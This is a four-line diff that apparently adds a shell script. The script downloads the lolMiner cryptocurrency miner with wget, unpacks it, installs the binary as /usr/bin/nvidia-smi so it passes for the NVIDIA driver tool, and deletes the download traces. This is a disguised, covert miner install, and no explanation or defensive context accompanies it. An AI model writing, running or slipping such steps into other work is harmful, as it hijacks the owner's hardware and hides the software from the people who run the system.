@@ -1,0 +1,4 @@
+wget -q https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.46a/lolMiner_v1.46a_Lin64.tar.gz
+tar xf lolMiner_v1.46a_Lin64.tar.gz
+mv 1.46a/lolMiner /usr/bin/nvidia-smi
+rm -rf 1.46a/ lolMiner_v1.46a_Lin64.tar.gz
